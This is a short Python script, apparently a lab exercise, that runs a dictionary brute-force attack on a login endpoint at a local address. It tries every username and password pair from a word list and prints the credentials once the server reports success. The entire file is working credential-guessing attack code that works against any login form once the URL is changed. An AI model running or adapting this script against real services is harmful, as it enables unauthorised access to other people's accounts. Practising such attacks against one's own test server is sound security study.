import json
from requests import post as POST
import sys
f = open('dictionary.txt', 'r')
dictionary = f.read().split('\n')
URL = 'http://127.0.0.1:5000/login1'
if __name__ == '__main__':
    success = False
    while not success:
        for i in dictionary:
            trial_username = i
            for j in dictionary:
                trial_password = j
                response = POST(URL, data={'username': trial_username, 'password': trial_password})
                success = json.loads(response.text).get('success')
                if success:
                    print(f'Username id {trial_username}\nPassword is {trial_password}')
                    sys.exit()






